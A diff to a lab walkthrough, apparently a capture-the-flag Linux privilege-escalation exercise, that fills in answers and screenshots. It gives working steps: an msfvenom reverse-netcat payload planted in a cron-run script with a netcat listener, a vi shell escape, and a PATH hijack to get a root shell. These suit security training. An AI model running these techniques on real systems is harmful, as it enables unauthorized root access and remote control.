@@ -317,7 +317,7 @@ https://gtfobins.github.io/
 
 * Now, type **":!sh"** to open a shell!
 
-    ![task7-vi](./images/task7-vi)
+    ![task7-vi](./images/task7-vi.png)
 
 ## Task 8 - Exploiting Crontab
 
@@ -365,19 +365,42 @@ We know from our LinEnum scan, that the file autoscript.sh, on user4's Desktop i
 
 * First, let's exit out of root from our previous task by typing **"exit"**. Then use **"su"** to swap to user4, with the password **"password"**
 
+    ![task8-user4](./images/task8-user4.png)
+
 * Now, on our host machine- let's create a payload for our cron exploit using msfvenom. 
 
 * What is the flag to specify a payload in msfvenom?
 
+    `-p`
+
 * Create a payload using: **"msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R"**
+
+    ![task8-msfvenom](./images/task8-msfvenom.png)
 
 * What directory is the "autoscript.sh" under?
 
+    `/home/user4/Desktop/`
+
+    ![task8-crontab](./images/task8-crontab.png)
+
 * Lets replace the contents of the file with our payload using: **"echo [MSFVENOM OUTPUT] > autoscript.sh"**
+
+    ![task8-echo](./images/task8-echo.png)
 
 * After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: **"nc -lvnp 8888"** and wait for our shell to land!
 
+    * Step 1 create simple http server on our machine
+
+        ![task8-http](./images/task8-http.png)
+
+    * step 2 download autoscript.sh on target machine
+
+        ![task8-wget](./images/CommonLinuxPrivesc.png)
+
+    
 * After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations! 
+
+    ![task8-shell](./images/task8-shell.png)
 
 ## Task 9 - Exploiting PATH Variable
 
@@ -401,27 +424,41 @@ As with any SUID file, it will run this command with the same privileges as the 
 
 * Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing **"exit"**. Then use "su" to swap to user5, with the password **"password"**
 
+    ![task9-user5](./images/task9-user5.png)
+
 * Let's go to user5's home directory, and run the file **"script"**. What command do we think that it's executing?
+
+    `ls`
+
+    ![task9-script](./images/task9-script.png)
 
 * Now we know what command to imitate, let's change directory to **"tmp"**. 
 
-Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:
+    Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:
 
-echo "[whatever command we want to run]" > [name of the executable we're imitating]
+    echo "[whatever command we want to run]" > [name of the executable we're imitating]
 
 * What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating
 
+    `echo "/bin/bash" > ls`
+    
+    ![task9-echo](./images/task9-echo.png)
+
 * Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?
 
-Now, we need to change the PATH variable, so that it points to the directory where we have our imitation **"ls"** stored! We do this using the command **"export PATH=/tmp:$PATH"**
+    `chmod +x ls`
 
-Note, this will cause you to open a bash prompt every time you use **"ls"**. If you need to use **"ls"** before you finish the exploit, use **"/bin/ls"** where the real **"ls"** executable is.
+    Now, we need to change the PATH variable, so that it points to the directory where we have our imitation **"ls"** stored! We do this using the command **"export PATH=/tmp:$PATH"**
+
+    Note, this will cause you to open a bash prompt every time you use **"ls"**. If you need to use **"ls"** before you finish the exploit, use **"/bin/ls"** where the real **"ls"** executable is.
 
 * Once you've finished the exploit, you can exit out of root and use **"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH"** to reset the PATH variable back to default, letting you use **"ls"** again!
 
 * Now, change directory back to user5's home directory.
 
 * Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!
+
+    ![task9-run](./images/task9-run.png)
 
 ## Task 10 - Expanding Your Knowledge 
 
